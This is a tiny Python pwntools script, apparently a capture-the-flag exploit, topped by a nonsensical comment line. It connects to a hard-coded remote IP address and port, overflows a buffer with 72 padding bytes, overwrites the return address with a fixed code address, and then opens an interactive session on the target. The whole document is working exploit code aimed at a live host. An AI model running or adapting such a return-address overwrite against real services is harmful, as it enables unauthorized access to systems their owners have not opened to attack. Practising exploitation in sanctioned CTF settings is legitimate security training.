#KOLLLLLL W WAKKELLLL
from pwn import *
p = remote("51.77.140.155" ,1329)
payload=b'A'*72+p64(0x40132d+1)
p.sendline(payload)
p.interactive()
